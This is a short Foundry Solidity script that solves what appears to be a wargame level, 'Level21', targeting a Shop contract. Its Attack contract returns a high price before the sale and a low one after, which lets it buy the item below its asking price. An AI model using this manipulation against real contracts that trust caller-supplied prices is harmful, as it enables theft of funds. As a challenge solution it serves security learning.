// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Shop} from "../src/Level21.sol";

contract Level21Sol is Script{
    Shop public instance = Shop(0x0a21654f3EA8917a109E09C32eC3aAF814e8d665);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack().exploit();
        vm.stopBroadcast();
    }
}

contract Attack{
    Shop public instance = Shop(0x0a21654f3EA8917a109E09C32eC3aAF814e8d665);

    function exploit() public {
        instance.buy();
    }
    function price() external view returns (uint){
        if(instance.isSold() == false){
            return 100;
        }
        return 9;
    }
}